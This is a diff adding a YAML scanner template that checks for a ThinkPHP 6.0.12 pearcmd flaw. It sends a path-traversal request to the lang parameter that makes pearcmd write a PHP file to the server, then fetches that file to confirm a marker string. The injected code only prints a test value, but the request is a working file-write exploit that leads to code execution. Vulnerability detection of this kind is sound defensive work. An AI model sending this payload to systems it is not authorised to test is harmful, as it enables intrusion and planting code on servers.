@@ -1,0 +1,12 @@
+name: poc-yaml-thinkphp6012-controller-rce
+groups:
+  poc1:
+    - method: GET
+      path: /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=print_r("test2025");?>+1.php
+      expression: |
+        response.body.bcontains(b"PEAR directory")
+  poc2:
+    - method: GET
+      path: /1.php
+      expression: |
+        response.body.bcontains(b"test2025")
